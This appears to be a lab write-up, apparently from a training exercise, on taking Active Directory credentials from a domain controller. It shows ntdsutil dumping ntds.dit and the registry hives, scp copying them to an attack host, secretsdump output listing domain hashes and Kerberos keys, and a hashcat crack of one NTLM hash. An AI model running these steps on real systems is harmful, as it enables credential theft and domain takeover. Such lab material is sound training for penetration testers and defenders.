# Domain Controller

## NTDS

NTDS is located in `C:\Windows\NTDS` by default, and it is encrypted to prevent data extraction from a target machine. 
Accessing the `NTDS.dit` file from the machine running is disallowed since the file is used by Active Directory and 
is locked. And there are various ways to gain access to it. 

Get a copy of the NTDS file using the `ntdsutil` and `Diskshadow` tool and dump the file's content. Decrypting the NTDS 
file requires a system Boot Key to decrypt LSA Isolated credentials. The Boot Key is stored in the SECURITY file system. 

## Ntdsutil

`Ntdsutil` is a Windows utility to used manage and maintain Active Directory configurations. It can be used in various 
scenarios:

* Restore deleted objects in Active Directory.
* Perform maintenance for the AD database.
* Active Directory snapshot management.
* Set Directory Services Restore Mode (DSRM) administrator passwords.

## Local Dumping (No Credentials)

This is usually done if you have no credentials available but have administrator access to the domain controller. 
Therefore, we will be relying on Windows utilities to dump the NTDS file and crack them offline. As a requirement, 
first, we assume we have administrator access to a domain controller. 

To successfully dump the content of the NTDS file we need the following files:

    C:\Windows\NTDS\ntds.dit
    C:\Windows\System32\config\SYSTEM
    C:\Windows\System32\config\SECURITY

To dump the NTDS file using the Ntdsutil tool in the `C:\temp` directory:

    powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"

The `c:\temp` directory now has two folders: Active Directory and registry, which contain the three files we need. 
Transfer them to the attack machine and run the `secretsdump.py` script to extract the hashes from the dumped memory 
file.

```text
c:\temp\Active Directory>scp .\ntds.dit nina@10.18.22.77:/home/nina/Downloads/last/
The authenticity of host '10.18.22.77 (10.18.22.77)' can't be established.
ECDSA key fingerprint is SHA256:RMXbGfqwBW5FiYWOSV2vVgv3+ypBISNAIlY/qZawIJ0.
Are you sure you want to continue connecting (yes/no)?
Warning: Permanently added '10.18.22.77' (ECDSA) to the list of known hosts.
nina@10.18.22.77's password:
ntds.dit                                                                              100%   24MB   1.2MB/s   00:20

c:\temp\Active Directory>cd ..\registry

c:\temp\registry>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of c:\temp\registry

11/10/2022  01:53 AM    <DIR>          .
11/10/2022  01:53 AM    <DIR>          ..
06/13/2022  09:40 AM            65,536 SECURITY
06/13/2022  09:40 AM        20,971,520 SYSTEM
               2 File(s)     21,037,056 bytes
               2 Dir(s)  10,265,694,208 bytes free

c:\temp\registry>scp .\SECURITY nina@10.18.22.77:/home/nina/Downloads/last/
nina@10.18.22.77's password:
SECURITY                                                                              100%   64KB 455.2KB/s   00:00

c:\temp\registry>scp .\SYSTEM nina@10.18.22.77:/home/nina/Downloads/last/
nina@10.18.22.77's password:
SYSTEM                                                                                100%   20MB   1.2MB/s   00:17

c:\temp\registry>
```

Extract hashes from NTDS locally:

```text
$ ls
ntds.dit  SECURITY  SYSTEM
                                                                                
$ sudo python3 /opt/impacket/examples/secretsdump.py -security SECURITY -system SYSTEM -ntds ntds.dit local
[sudo] password for nina: 
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:c232a51e1cdcaaed24259e15687cbfc7a0130457855c918ebfccd5c54ab70c8f5b916aed1554619c1b617918098cb2dd3e3b981c61ccdba2af687d5d4d3a0aa6ae652f6d6c05cc30f21c75bd268107a5d07f60a0ef156073d5dc0282fe87d819d2ad387ab71ffc53fc56a34350ac3c2f990ca9aacacc615ab78576a52033dd468d1b6cf29f9ca18fb3c97b523e0289a0df7806b2a4d303714483d548fbb0866068cd17bad7c21ab5a00e863d17c8f6ddf88f6a3d72b425b231d6963968e7fbeba968e119f4c296cf600c2f53f31f2b383bf53cf1b9cbe0afccb04b36ce1759c91ffebf1649d9aea4c66c4b59f0f2a3f1
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:b1800dfad5dc7a67143f158c68497624
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x0e88ce11d311d3966ca2422ac2708a4d707e00be
dpapi_userkey:0x8b68be9ef724e59070e7e3559e10078e36e8ab32
[*] NL$KM 
 0000   8D D2 8E 67 54 58 89 B1  C9 53 B9 5B 46 A2 B3 66   ...gTX...S.[F..f
 0010   D4 3B 95 80 92 7D 67 78  B7 1D F9 2D A5 55 B7 A3   .;...}gx...-.U..
 0020   61 AA 4D 86 95 85 43 86  E3 12 9E C4 91 CF 9A 5B   a.M...C........[
 0030   D8 BB 0D AE FA D3 41 E0  D8 66 3D 19 75 A2 D1 B2   ......A..f=.u...
NL$KM:8dd28e67545889b1c953b95b46a2b366d43b9580927d6778b71df92da555b7a361aa4d8695854386e3129ec491cf9a5bd8bb0daefad341e0d8663d1975a2d1b2
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 55db1e9562985070bbba0ef2cc25754c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc9b72f354f0371219168bdb1460af32:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:b1800dfad5dc7a67143f158c68497624:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::
thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
thm.red\victim:1115:aad3b435b51404eeaad3b435b51404ee:6c3d8f78c69ff2ebc377e19e96a10207:::
thm.red\thm-local:1116:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\admin:1118:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\svc-thm:1119:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f:::
thm.red\bk-admin:1120:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\test-user:1127:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f:::
sshd:1128:aad3b435b51404eeaad3b435b51404ee:a78d0aa18c049d268b742ea360849666:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:510e0d5515009dc29df8e921088e82b2da0955ed41e83d4c211031b99118bf30
Administrator:aes128-cts-hmac-sha1-96:bab514a24ef3df25c182f5520bfc54a0
Administrator:des-cbc-md5:6d34e608f8574632
CREDS-HARVESTIN$:aes256-cts-hmac-sha1-96:508aa735622e15c3fdd0a12f52ce779fa382205b828bdc0f441ddfeaef1bbf13
CREDS-HARVESTIN$:aes128-cts-hmac-sha1-96:db9e72cb40e0f8b93a7f44e7f79669fc
CREDS-HARVESTIN$:des-cbc-md5:f434a7298562ec6e
krbtgt:aes256-cts-hmac-sha1-96:24fad271ecff882bfce29d8464d84087c58e5db4083759e69d099ecb31573ad3
krbtgt:aes128-cts-hmac-sha1-96:2feb0c1629b37163d59d4c0deb5ce64c
krbtgt:des-cbc-md5:d92ffd4abf02b049
thm.red\thm:aes256-cts-hmac-sha1-96:2a54bb9728201d8250789f5e793db4097630dcad82c93bcf9342cb8bf20443ca
thm.red\thm:aes128-cts-hmac-sha1-96:70179d57a210f22ad094726be50f703c
thm.red\thm:des-cbc-md5:794f3889e646e383
thm.red\victim:aes256-cts-hmac-sha1-96:588635fd39ef8a9a0dd1590285712cb2899d0ba092a6e4e87133e4c522be24ac
thm.red\victim:aes128-cts-hmac-sha1-96:672064af4dd22ebf2f0f38d86eaf0529
thm.red\victim:des-cbc-md5:457cdc673d3b0d85
thm.red\thm-local:aes256-cts-hmac-sha1-96:a7e2212b58079608beb08542187c9bef1419d60a0daf84052e25e35de1f04a26
thm.red\thm-local:aes128-cts-hmac-sha1-96:7c929b738f490328b13fb14a6cfb09cf
thm.red\thm-local:des-cbc-md5:9e3bdc4c2a6b62c4
thm.red\admin:aes256-cts-hmac-sha1-96:7441bc46b3e9c577dae9b106d4e4dd830ec7a49e7f1df1177ab2f349d2867c6f
thm.red\admin:aes128-cts-hmac-sha1-96:6ffd821580f6ed556aa51468dc1325e6
thm.red\admin:des-cbc-md5:32a8a201d3080b2f
thm.red\svc-thm:aes256-cts-hmac-sha1-96:8de18b5b63fe4083e22f09dcbaf7fa62f1d409827b94719fe2b0e12f5e5c798d
thm.red\svc-thm:aes128-cts-hmac-sha1-96:9fa57f1b464153d547cca1e72ad6bc8d
thm.red\svc-thm:des-cbc-md5:f8e57c49f7dc671c
thm.red\bk-admin:aes256-cts-hmac-sha1-96:48b7d6de0b3ef3020b2af33aa43a963494d22ccbea14a0ee13b63edb1295400e
thm.red\bk-admin:aes128-cts-hmac-sha1-96:a6108bf8422e93d46c2aef5f3881d546
thm.red\bk-admin:des-cbc-md5:108cc2b0d3100767
thm.red\test-user:aes256-cts-hmac-sha1-96:2102b093adef0a9ddafe0ad5252df78f05340b19dfac8af85a4b4df25f6ab660
thm.red\test-user:aes128-cts-hmac-sha1-96:dba3f53ecee22330b5776043cd203b64
thm.red\test-user:des-cbc-md5:aec8e3325b85316b
sshd:aes256-cts-hmac-sha1-96:07046594c869e3e8094de5caa21539ee557b4d3249443e1f8b528c4495725242
sshd:aes128-cts-hmac-sha1-96:e228ee34b8265323725b85c6c3c7d85f
sshd:des-cbc-md5:b58f850b4c082cc7
[*] Cleaning up... 
```

NTLM hash for `bk-admin` is `077cccc23f8ab7031726a3b70c694a49`. Put in a file named `hash`, and crack it with 
`hashcat`:

```text
$ hashcat -m 1000 -a 0 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-1185G7 @ 3.00GHz, 2921/5907 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

077cccc23f8ab7031726a3b70c694a49:Passw0rd123              
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 077cccc23f8ab7031726a3b70c694a49
Time.Started.....: Thu Nov 10 02:30:07 2022 (0 secs)
Time.Estimated...: Thu Nov 10 02:30:07 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  5432.6 kH/s (0.08ms) @ Accel:512 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2103296/14344385 (14.66%)
Rejected.........: 0/2103296 (0.00%)
Restore.Point....: 2101248/14344385 (14.65%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: R679FUKU -> Passp0rt

Started: Thu Nov 10 02:29:36 2022
Stopped: Thu Nov 10 02:30:08 2022
```